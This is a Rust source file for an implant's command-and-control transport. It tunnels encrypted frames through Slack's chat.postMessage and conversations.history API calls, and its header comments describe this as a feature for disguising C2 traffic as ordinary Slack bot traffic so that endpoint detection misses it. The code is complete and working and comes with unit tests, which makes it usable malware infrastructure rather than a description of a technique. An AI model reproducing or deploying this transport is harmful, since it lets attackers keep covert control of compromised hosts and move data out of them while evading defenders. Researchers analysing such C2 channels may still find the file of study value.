//! Slack API C2 transport channel.
//!
//! BRC4 Mercury v2.5 killer feature: the implant posts encrypted frames as Slack
//! messages to a private channel, and the C2 server responds via the same
//! channel. To Slack it looks like a bot conversation. To EDR it looks like
//! normal Slack API traffic to `api.slack.com`.
//!
//! ## Protocol
//! - `send`: Base64-encode the frame, POST to `chat.postMessage` as message text.
//! - `recv`: Poll `conversations.history`, filter out own bot messages, Base64-decode
//!   the text of the first new message, return the frame.
//! - `health_check`: Call `auth.test` to verify the token and measure latency.
//!
//! ## Rate limiting
//! Slack enforces ~1 msg/sec per channel. We enforce a 1.2 s inter-message gap to
//! stay under the limit without triggering 429s.

use std::time::{Duration, Instant};

use base64::Engine as _;
use serde::Deserialize;

use crate::traits::{Transport, TransportError};

// ---- Slack API JSON shapes ------------------------------------------------

#[derive(Debug, Deserialize)]
struct HistoryPayload {
    #[serde(default)]
    messages: Vec<SlackMessage>,
}

#[derive(Debug, Deserialize)]
struct SlackMessage {
    ts: String,
    #[serde(default)]
    text: String,
    #[serde(default)]
    user: Option<String>,
}

#[derive(Debug, Deserialize)]
struct PostMessagePayload {
    #[serde(default)]
    ts: Option<String>,
}

// ---- Transport ------------------------------------------------------------

const SLACK_API_BASE: &str = "https://slack.com/api/";
const SEND_COOLDOWN_MS: u64 = 1200;
const POLL_INTERVAL_MS: u64 = 500;
const MAX_FRAME: usize = 40 * 1024;

/// Slack API C2 transport channel.
///
/// Uses a Slack Bot User OAuth Token (`xoxb-...`) to post and read messages
/// in a private channel. The implant and C2 server communicate by exchanging
/// Base64-encoded frames as message text.
pub struct SlackTransport {
    bot_token: String,
    channel_id: String,
    bot_user_id: Option<String>,
    agent: ureq::Agent,
    last_ts: Option<String>,
    next_send_after: Option<Instant>,
}

impl SlackTransport {
    /// Create a new Slack transport channel.
    ///
    /// `bot_token` must be a Slack Bot User OAuth Token (`xoxb-...`).
    /// `channel_id` is the Slack channel ID (e.g. `C0123456789`) — not the
    /// channel name. The bot must be invited to the channel with `chat:write`
    /// and `channels:history` scopes.
    pub fn new(bot_token: String, channel_id: String) -> Self {
        Self {
            bot_token,
            channel_id,
            bot_user_id: None,
            agent: ureq::AgentBuilder::new()
                .timeout(Duration::from_secs(10))
                .build(),
            last_ts: None,
            next_send_after: None,
        }
    }

    // -- internal helpers ---------------------------------------------------

    fn auth_header(&self) -> String {
        format!("Bearer {}", self.bot_token)
    }

    /// POST to a Slack API method with a JSON body. Returns the raw response on
    /// success, or a `TransportError` on failure.
    fn slack_post(
        &self,
        method: &str,
        body: serde_json::Value,
    ) -> Result<ureq::Response, TransportError> {
        let url = format!("{SLACK_API_BASE}{method}");
        let resp = self
            .agent
            .post(&url)
            .set("Authorization", &self.auth_header())
            .set("Content-Type", "application/json; charset=utf-8")
            .send_json(body)
            .map_err(|e| self.classify_ureq_error(e))?;
        Ok(resp)
    }

    /// GET a Slack API method with query params. Returns the raw response.
    fn slack_get(
        &self,
        method: &str,
        params: &[(&str, &str)],
    ) -> Result<ureq::Response, TransportError> {
        let url = format!("{SLACK_API_BASE}{method}");
        let mut req = self
            .agent
            .get(&url)
            .set("Authorization", &self.auth_header());
        for (k, v) in params {
            req = req.query(k, v);
        }
        let resp = req.call().map_err(|e| self.classify_ureq_error(e))?;
        Ok(resp)
    }

    /// Classify a `ureq::Error` into a `TransportError`.
    fn classify_ureq_error(&self, e: ureq::Error) -> TransportError {
        match &e {
            ureq::Error::Status(429, _) => TransportError::Transient("Slack rate limited (429)"),
            ureq::Error::Status(401, _) => TransportError::Dead("Slack token invalid (401)"),
            ureq::Error::Status(403, _) => {
                TransportError::Dead("Slack token lacks required scopes (403)")
            }
            ureq::Error::Status(code, _) if *code >= 500 => {
                TransportError::Transient("Slack server error (5xx)")
            }
            ureq::Error::Transport(_) => {
                TransportError::Transient("Slack transport error (network)")
            }
            _ => TransportError::Transient("Slack API error"),
        }
    }

    /// Resolve the bot user ID by calling `auth.test`. Used during `init()`.
    fn resolve_bot_user_id(&mut self) -> Result<(), TransportError> {
        let resp: serde_json::Value = self
            .agent
            .post(&format!("{SLACK_API_BASE}auth.test"))
            .set("Authorization", &self.auth_header())
            .set("Content-Type", "application/json; charset=utf-8")
            .send_json(serde_json::json!({}))
            .map_err(|e| self.classify_ureq_error(e))?
            .into_json()
            .map_err(|_| TransportError::Transient("Slack auth.test parse error"))?;

        let ok = resp["ok"].as_bool().unwrap_or(false);
        if !ok {
            let err = resp["error"].as_str().unwrap_or("unknown");
            return Err(match err {
                "invalid_auth" | "token_revoked" | "account_inactive" => {
                    TransportError::Dead("Slack token invalid")
                }
                _ => TransportError::Transient("Slack auth.test failed"),
            });
        }

        self.bot_user_id = resp["user_id"].as_str().map(|s| s.to_owned());
        Ok(())
    }

    /// Poll Slack history for new messages. Returns `Ok(Some(frame))` if a new
    /// C2 message was found, `Ok(None)` if nothing new, or `Err` on failure.
    fn poll_history(&mut self) -> Result<Option<Vec<u8>>, TransportError> {
        let mut params = vec![("channel", self.channel_id.as_str()), ("limit", "5")];
        let oldest_str;
        if let Some(ref ts) = self.last_ts {
            oldest_str = ts.clone();
            params.push(("oldest", &oldest_str));
        }

        let resp = self.slack_get("conversations.history", &params)?;
        let payload: HistoryPayload = resp
            .into_json()
            .map_err(|_| TransportError::Transient("Slack history parse error"))?;

        // Find the first message that is NOT from our own bot.
        for msg in &payload.messages {
            let is_own = self
                .bot_user_id
                .as_deref()
                .is_some_and(|uid| msg.user.as_deref() == Some(uid));
            if is_own || msg.text.is_empty() {
                continue;
            }

            // Decode the frame.
            let frame = base64::engine::general_purpose::STANDARD
                .decode(&msg.text)
                .map_err(|_| TransportError::Transient("Slack message: bad base64"))?;

            // Advance the cursor.
            self.last_ts = Some(msg.ts.clone());
            return Ok(Some(frame));
        }

        // Update cursor to the latest message timestamp even if we didn't find
        // a C2 message, so we don't re-scan the same messages on the next poll.
        if let Some(latest) = payload.messages.first() {
            self.last_ts = Some(latest.ts.clone());
        }

        Ok(None)
    }

    /// Enforce send rate limit (1.2 s between messages).
    fn enforce_rate_limit(&mut self) {
        if let Some(next) = self.next_send_after {
            let now = Instant::now();
            if now < next {
                std::thread::sleep(next - now);
            }
        }
    }
}

impl Transport for SlackTransport {
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
        if frame.len() > MAX_FRAME {
            return Err(TransportError::PayloadTooLarge(frame.len()));
        }

        self.enforce_rate_limit();

        let text = base64::engine::general_purpose::STANDARD.encode(frame);
        let body = serde_json::json!({
            "channel": self.channel_id,
            "text": text,
        });

        let resp = self.slack_post("chat.postMessage", body)?;
        let payload: PostMessagePayload = resp
            .into_json()
            .map_err(|_| TransportError::Transient("Slack postMessage parse error"))?;

        if let Some(ts) = payload.ts {
            self.last_ts = Some(ts);
        }

        self.next_send_after = Some(Instant::now() + Duration::from_millis(SEND_COOLDOWN_MS));
        Ok(())
    }

    fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        if self.bot_user_id.is_none() {
            // Lazy-init: resolve bot user ID on first recv if init() wasn't called.
            self.resolve_bot_user_id()?;
        }

        let deadline = Instant::now() + Duration::from_millis(timeout_ms as u64);

        loop {
            match self.poll_history() {
                Ok(Some(frame)) => return Ok(frame),
                Ok(None) => {
                    if Instant::now() >= deadline {
                        return Err(TransportError::Timeout);
                    }
                    std::thread::sleep(Duration::from_millis(POLL_INTERVAL_MS));
                }
                Err(e) => return Err(e),
            }
        }
    }

    fn health_check(&self) -> Option<u64> {
        let start = Instant::now();
        let resp = self
            .agent
            .post(&format!("{SLACK_API_BASE}auth.test"))
            .set("Authorization", &self.auth_header())
            .set("Content-Type", "application/json; charset=utf-8")
            .send_json(serde_json::json!({}));

        match resp {
            Ok(r) => match r.into_json::<serde_json::Value>() {
                Ok(v) if v["ok"].as_bool().unwrap_or(false) => {
                    Some(start.elapsed().as_millis() as u64)
                }
                _ => None,
            },
            Err(_) => None,
        }
    }

    fn name(&self) -> &'static str {
        "slack-api"
    }

    fn max_frame_size(&self) -> usize {
        MAX_FRAME
    }

    fn init(&mut self) -> Result<(), TransportError> {
        self.resolve_bot_user_id()
    }
}

// ---- Tests ----------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn max_frame_size_is_40k() {
        let t = SlackTransport::new("xoxb-test".into(), "C000".into());
        assert_eq!(t.max_frame_size(), 40 * 1024);
    }

    #[test]
    fn name_is_slack_api() {
        let t = SlackTransport::new("xoxb-test".into(), "C000".into());
        assert_eq!(t.name(), "slack-api");
    }

    #[test]
    fn oversized_frame_rejected() {
        let mut t = SlackTransport::new("xoxb-test".into(), "C000".into());
        let big = vec![0u8; 41 * 1024];
        match t.send(&big) {
            Err(TransportError::PayloadTooLarge(n)) => assert_eq!(n, 41 * 1024),
            other => panic!("expected PayloadTooLarge, got {other:?}"),
        }
    }

    #[test]
    fn send_cooldown_advances_timer() {
        let mut t = SlackTransport::new("xoxb-test".into(), "C000".into());
        assert!(t.next_send_after.is_none());
        t.enforce_rate_limit();
        // No-op when next_send_after is None.
        t.next_send_after = Some(Instant::now() + Duration::from_millis(SEND_COOLDOWN_MS));
        let before = Instant::now();
        t.enforce_rate_limit();
        assert!(before.elapsed() >= Duration::from_millis(SEND_COOLDOWN_MS));
    }
}
